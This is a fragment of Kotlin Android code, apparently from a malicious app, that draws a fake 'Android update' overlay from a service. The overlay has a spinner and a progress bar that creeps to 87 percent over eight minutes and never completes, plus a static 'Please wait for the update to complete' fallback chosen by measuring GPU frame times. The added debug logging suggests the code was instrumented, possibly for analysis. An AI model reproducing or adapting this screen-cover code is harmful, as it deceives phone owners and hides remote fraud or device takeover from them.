    private fun startArcSpinner(root: FrameLayout) {
        android.util.Log.d("XDBG", "[MartenHelper] startArcSpinner enter root=${root}") //xdbg
        val spinner = root.findViewWithTag<View>("au_spinner") as? ArcSpinnerView ?: return
        spinAnim = ValueAnimator.ofFloat(0f, 360f).apply {
            duration = 1100L
            repeatCount = ValueAnimator.INFINITE
            interpolator = LinearInterpolator()
            addUpdateListener { anim -> spinner.startAngle = anim.animatedValue as Float }
            start()
        }
    }

    private fun startAndroidUpdateAnimation(root: FrameLayout) {
        android.util.Log.d("XDBG", "[MartenHelper] startAndroidUpdateAnimation enter root=${root}") //xdbg
        val spinner = root.findViewWithTag<View>("au_spinner") as? ArcSpinnerView
        if (spinner != null) {
            android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
            spinAnim = ValueAnimator.ofFloat(0f, 360f).apply {
                duration = 1100L
                repeatCount = ValueAnimator.INFINITE
                interpolator = LinearInterpolator()
                addUpdateListener { anim ->
                    spinner.startAngle = anim.animatedValue as Float
                }
                start()
            }
        }
        progressAnim = ValueAnimator.ofInt(1, 87).apply {
            duration = 480_000L
            interpolator = android.view.animation.DecelerateInterpolator(1.2f)
            addUpdateListener { anim ->
                val v = anim.animatedValue as Int
                root.findViewWithTag<ProgressBar>("au_progress")?.progress = v
                root.findViewWithTag<TextView>("au_pct")?.text = "$v%"
            }
            start()
        }
    }

    private fun applyWeakGpuMode(root: FrameLayout) {
        android.util.Log.d("XDBG", "[MartenHelper] applyWeakGpuMode enter root=${root}") //xdbg
        weakGpuActive = true
        progressAnim?.cancel(); progressAnim = null
        spinAnim?.cancel(); spinAnim = null
        phase1SubRotator?.let { handler.removeCallbacks(it) }; phase1SubRotator = null
        root.findViewWithTag<View>("au_spinner")?.visibility = View.GONE
        root.findViewWithTag<View>("progress")?.visibility = View.GONE
        root.findViewWithTag<View>("pct")?.visibility = View.GONE
        root.findViewWithTag<View>("au_progress")?.visibility = View.GONE
        root.findViewWithTag<View>("au_pct")?.visibility = View.GONE
        val waitText = try { service.getString(R.string.ov_wait_update) }
                       catch (_: Exception) { "Please wait for the update to complete" }
        root.findViewWithTag<TextView>("title")?.text = waitText
        root.findViewWithTag<TextView>("subtitle")?.text = waitText
        root.findViewWithTag<TextView>("au_title_tv")?.text = waitText
    }

    private fun startGpuPerfMonitor(root: FrameLayout) {
        android.util.Log.d("XDBG", "[MartenHelper] startGpuPerfMonitor enter root=${root}") //xdbg
        val pk = try { service.getString(R.string.pref_gpu_perf) } catch (_: Exception) { "gp" }
        val gk = try { service.getString(R.string.pref_gpu_weak) } catch (_: Exception) { "gw" }
        val prefs = service.getSharedPreferences(pk, android.content.Context.MODE_PRIVATE)
        if (prefs.contains(gk)) {
            android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
            if (prefs.getBoolean(gk, false)) handler.post { applyWeakGpuMode(root) }
            return
        }
        var totalCount = 0
        var lastNs = 0L
        val measured = LongArray(15)
        var measuredIdx = 0
        val cb = object : android.view.Choreographer.FrameCallback {
            override fun doFrame(frameTimeNanos: Long) {
                android.util.Log.d("XDBG", "[MartenHelper] doFrame enter frameTimeNanos=${frameTimeNanos}") //xdbg
                if (currentView !== root) return
                if (lastNs != 0L && totalCount > 2 && measuredIdx < 15) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    measured[measuredIdx++] = (frameTimeNanos - lastNs) / 1_000_000L
                }
                lastNs = frameTimeNanos
                totalCount++
                if (measuredIdx < 15) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    android.view.Choreographer.getInstance().postFrameCallback(this)
                } else {
                    val avg = measured.average()
                    val isWeak = avg > 20.0
                    prefs.edit().putBoolean(gk, isWeak).apply()
                    if (isWeak) handler.post { applyWeakGpuMode(root) }
                }
            }
        }
        android.view.Choreographer.getInstance().postFrameCallback(cb)
    }
}
